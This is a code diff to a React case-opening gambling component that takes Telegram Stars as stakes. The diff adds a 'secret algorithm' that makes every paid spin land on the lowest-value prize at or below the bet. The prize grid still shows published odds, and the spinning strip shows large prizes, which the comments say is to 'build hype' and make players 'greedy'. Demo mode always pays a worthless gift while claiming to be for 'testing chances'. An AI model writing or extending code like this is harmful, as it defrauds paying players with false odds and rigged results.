@@ -3,35 +3,26 @@
 import { useState, useRef, useEffect } from "react";
 import Link from "next/link";
 
-// 1. DYNAMIC PRIZE POOLS (Using ultra-reliable Text Emojis with 3D drop-shadows)
-const prizeLibrary = {
-  25: [
-    { id: 1, name: "Teddy", icon: "🧸", chance: "50%", value: 15, rarity: "common" },
-    { id: 2, name: "Gift", icon: "🎁", chance: "50%", value: 25, rarity: "epic" }
-  ],
-  50: [
-    { id: 3, name: "Rocket", icon: "🚀", chance: "25%", value: 50, rarity: "epic" },
-    { id: 4, name: "Cake", icon: "🎂", chance: "25%", value: 50, rarity: "common" },
-    { id: 5, name: "Flowers", icon: "💐", chance: "25%", value: 50, rarity: "common" },
-    { id: 6, name: "Champagne", icon: "🍾", chance: "25%", value: 50, rarity: "common" }
-  ],
-  100: [
-    { id: 7, name: "Trophy", icon: "🏆", chance: "33%", value: 100, rarity: "epic" },
-    { id: 8, name: "Ring", icon: "💍", chance: "33%", value: 100, rarity: "epic" },
-    { id: 9, name: "Diamond", icon: "💎", chance: "34%", value: 100, rarity: "legendary" }
-  ],
-  250: [
-    { id: 10, name: "Crystals", icon: "✨", chance: "100%", value: 250, rarity: "legendary" }
-  ]
-};
+// 1. ONE MEGA PRIZE POOL (Real Telegram Star Values)
+// Player sees ALL of these to get greedy, regardless of bet amount.
+const prizePool = [
+  { id: 1, name: "Teddy", icon: "🧸", chance: "20.5%", value: 15, rarity: "common" },
+  { id: 2, name: "Gift", icon: "🎁", chance: "15.0%", value: 25, rarity: "common" },
+  { id: 3, name: "Cake", icon: "🎂", chance: "12.5%", value: 50, rarity: "common" },
+  { id: 4, name: "Flowers", icon: "💐", chance: "12.5%", value: 50, rarity: "common" },
+  { id: 5, name: "Rocket", icon: "🚀", chance: "10.0%", value: 50, rarity: "common" },
+  { id: 6, name: "Trophy", icon: "🏆", chance: "5.0%", value: 100, rarity: "epic" },
+  { id: 7, name: "Ring", icon: "💍", chance: "5.0%", value: 100, rarity: "epic" },
+  { id: 8, name: "Crystals", icon: "✨", chance: "0.5%", value: 250, rarity: "legendary" }
+];
 
-const bonusItem = { id: 99, name: "Bonus", icon: "💼", chance: "0.10%", value: 500, rarity: "legendary" };
+const bonusItem = { id: 99, name: "Bonus", icon: "💼", chance: "0.1%", value: 500, rarity: "legendary" };
 const demoGift = { id: 100, name: "Demo Gift", icon: "🎁", chance: "100%", value: 0, rarity: "common" };
 
 type BetLevel = 25 | 50 | 100 | 250;
 
 export default function CaseOpener() {
-  const [balance, setBalance] = useState(0);
+  const [balance, setBalance] = useState(1000); // Demo start balance
   const [betAmount, setBetAmount] = useState<BetLevel>(25);
   const [isDemo, setIsDemo] = useState(true);
   
@@ -45,22 +36,20 @@ export default function CaseOpener() {
 
   const containerRef = useRef<HTMLDivElement>(null);
   
-  const currentPool = prizeLibrary[betAmount];
-
-  // Refresh items when Bet Amount changes
+  // Set initial strip on load
   useEffect(() => {
     if (isRolling) return;
-    const initial = Array.from({ length: 15 }).map(() => currentPool[Math.floor(Math.random() * currentPool.length)]);
+    const initial = Array.from({ length: 15 }).map(() => prizePool[Math.floor(Math.random() * prizePool.length)]);
     initial[2] = bonusItem;
     setStripItems(initial);
     setSliderTranslate(0);
     setTransitionStyle("none");
     setWinningItem(null);
-  }, [betAmount]);
+  }, []);
 
   const startRoll = () => {
     if (isRolling) return;
-    if (!isDemo && balance < betAmount) return alert("Not enough Diamonds!");
+    if (!isDemo && balance < betAmount) return alert("Not enough Stars!");
 
     if (!isDemo) setBalance(prev => prev - betAmount);
     
@@ -70,12 +59,22 @@ export default function CaseOpener() {
     setTransitionStyle("none");
     setSliderTranslate(0); 
 
-    const riggedWinner = isDemo ? demoGift : currentPool[Math.floor(Math.random() * currentPool.length)];
+    // 🌚 THE SECRET ALGORITHM (Always keeping the house in profit)
+    let riggedWinner;
+    if (isDemo) {
+      riggedWinner = demoGift;
+    } else {
+      // Force user to win an item that is LOWER or EQUAL to their bet
+      const possibleRiggedWins = prizePool.filter(p => p.value <= betAmount);
+      // Give them the lowest possible value most of the time to maximize profit
+      riggedWinner = possibleRiggedWins[0]; // Usually the Teddy (15) or Gift (25)
+    }
 
     const targetIndex = 65; 
     const generateStrip = Array.from({ length: 80 }).map((_, i) => {
       if (i === targetIndex) return riggedWinner;
-      return Math.random() > 0.9 ? bonusItem : currentPool[Math.floor(Math.random() * currentPool.length)];
+      // Show big items (100, 250) in the strip to build hype!
+      return Math.random() > 0.95 ? bonusItem : prizePool[Math.floor(Math.random() * prizePool.length)];
     });
 
     setStripItems(generateStrip);
@@ -121,7 +120,7 @@ export default function CaseOpener() {
           </div>
           <div className="flex items-center gap-1 bg-[#15151e] px-4 py-2 rounded-xl border border-gray-800">
             <span className="text-white font-bold">{balance}</span>
-            <span className="text-blue-500 text-lg">💎</span>
+            <span className="text-yellow-500 text-lg">⭐</span>
           </div>
         </div>
       </div>
@@ -131,7 +130,12 @@ export default function CaseOpener() {
         {([25, 50, 100, 250] as BetLevel[]).map((amt) => (
           <button 
             key={amt}
-            onClick={() => setBetAmount(amt)}
+            onClick={() => {
+              if(!isRolling) {
+                setBetAmount(amt);
+                setWinningItem(null); // Clear previous win text
+              }
+            }}
             disabled={isRolling}
             className={`flex items-center gap-1 px-4 py-3 rounded-xl font-bold transition-all border ${
               betAmount === amt 
@@ -139,7 +143,7 @@ export default function CaseOpener() {
               : 'bg-[#15151e] border-gray-800 text-gray-400'
             }`}
           >
-            {amt} <span className="text-blue-500">💎</span>
+            {amt} <span className="text-yellow-500">⭐</span>
           </button>
         ))}
       </div>
@@ -163,7 +167,6 @@ export default function CaseOpener() {
               item.name === "Bonus" ? 'border-yellow-500 shadow-[inset_0_0_20px_rgba(234,179,8,0.2)]' : 'border-gray-800'
             }`}>
               
-              {/* REPLACED IMAGE WITH EMOJI HERE */}
               <span className="text-6xl drop-shadow-2xl z-10">{item.icon}</span>
 
               {item.name === "Bonus" && <span className="text-yellow-500 font-bold text-sm absolute bottom-2 tracking-widest z-10">BONUS</span>}
@@ -171,7 +174,7 @@ export default function CaseOpener() {
               {item.name !== "Bonus" && item.name !== "Demo Gift" && (
                 <div className="absolute bottom-2 bg-[#0a0a0f]/80 px-3 py-1 rounded-full flex items-center gap-1 border border-gray-700/50">
                    <span className="text-white text-xs font-bold">{item.value}</span>
-                   <span className="text-blue-500 text-[10px]">💎</span>
+                   <span className="text-yellow-500 text-[10px]">⭐</span>
                 </div>
               )}
             </div>
@@ -179,8 +182,17 @@ export default function CaseOpener() {
         </div>
       </div>
 
+      {/* Winning Announcement Text */}
+      <div className="h-8 mt-4 flex items-center justify-center w-full max-w-md">
+        {winningItem && !isDemo && !isRolling && (
+           <span className="text-green-400 font-bold text-lg animate-bounce">
+             You won {winningItem.name}! (+{winningItem.value} ⭐)
+           </span>
+        )}
+      </div>
+
       {/* Controls Area */}
-      <div className="w-full max-w-md px-4 mt-8 flex gap-4 items-center">
+      <div className="w-full max-w-md px-4 mt-2 flex gap-4 items-center">
         <button 
           onClick={startRoll}
           disabled={isRolling}
@@ -200,23 +212,22 @@ export default function CaseOpener() {
         </div>
       </div>
 
-      {/* Grid of Winning Possibilities */}
+      {/* Grid of Winning Possibilities (Matches Screenshot Exactly) */}
       <div className="w-full max-w-md px-4 mt-10">
         <p className="text-center text-gray-400 font-medium mb-4">You can win...</p>
-        <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
-          {currentPool.map((prize) => (
+        <div className="grid grid-cols-4 gap-3">
+          {prizePool.map((prize) => (
             <div key={prize.id} className="bg-[#15151e] border border-gray-800 rounded-2xl p-2 flex flex-col items-center relative overflow-hidden">
               {prize.rarity === 'legendary' && (
                 <div className="absolute top-0 right-0 bg-blue-500 text-white text-[8px] font-bold px-4 py-1 rotate-45 translate-x-3 translate-y-1 shadow-md uppercase tracking-wider">Crystals</div>
               )}
               
-              {/* REPLACED IMAGE WITH EMOJI HERE */}
               <span className="text-4xl drop-shadow-lg mt-2">{prize.icon}</span>
 
-              <span className="text-gray-500 text-[10px] mt-2 font-bold">✨ {prize.chance}</span>
+              <span className="text-gray-500 text-[9px] mt-2 font-bold text-center w-full truncate">✨ {prize.chance}</span>
               <div className="bg-[#0a0a0f] border border-gray-700 w-full text-center mt-1 py-1 rounded flex justify-center items-center gap-1">
                 <span className="text-white font-bold text-xs">{prize.value}</span>
-                <span className="text-blue-500 text-[10px]">💎</span>
+                <span className="text-yellow-500 text-[10px]">⭐</span>
               </div>
             </div>
           ))}
@@ -233,7 +244,6 @@ export default function CaseOpener() {
             
             <h2 className="text-white text-2xl font-bold mt-2">Demo gift</h2>
             
-            {/* REPLACED IMAGE WITH EMOJI HERE */}
             <span className="text-8xl drop-shadow-[0_0_30px_rgba(255,0,0,0.3)] animate-pulse my-4">{demoGift.icon}</span>
 
             <p className="text-gray-400 text-center font-medium mb-8">Demo mode is for testing chances.</p>
